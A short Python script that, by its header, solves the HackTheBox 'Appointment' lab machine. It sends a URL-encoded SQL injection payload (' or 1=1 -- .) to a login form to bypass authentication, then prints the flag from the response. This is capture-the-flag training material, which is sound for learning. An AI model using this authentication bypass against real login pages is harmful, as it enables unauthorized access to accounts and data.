'''
Author: h8handles
Date: 2022
Description: This is a script to complete the HackTheBox machine Appointment on the Starting Point track.
This will preform the sql injection technique on the login page and retrieve the flag. 


'''



import requests
import urllib
from bs4 import BeautifulSoup

url = 'http://10.129.37.249/?'
payload = "' or 1=1 -- ."
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0","Connection":"close","Content-Type":"application/x-www-form-urlencoded"}
#replaces known bad characters
payload = payload.replace(" ","+")
payload = payload.replace("=","%3D+")
payload = payload.replace("'","%27")
#Requests was double urlencoding some of my charachters
#Here we store the payload in data and  set the safe characters to the ones it double encoded. 
data = {"username":"admin","password":f"{payload}"}
data_str = urllib.parse.urlencode(data,safe='+\'%')
#sqli request posted
r = requests.post(url,data=data_str,headers=headers)


#get contents of the flag. 
if 'Your flag is:' in r.text:
	get_flag = BeautifulSoup(r.text,features="html.parser").h4.contents[0]
	print(get_flag)
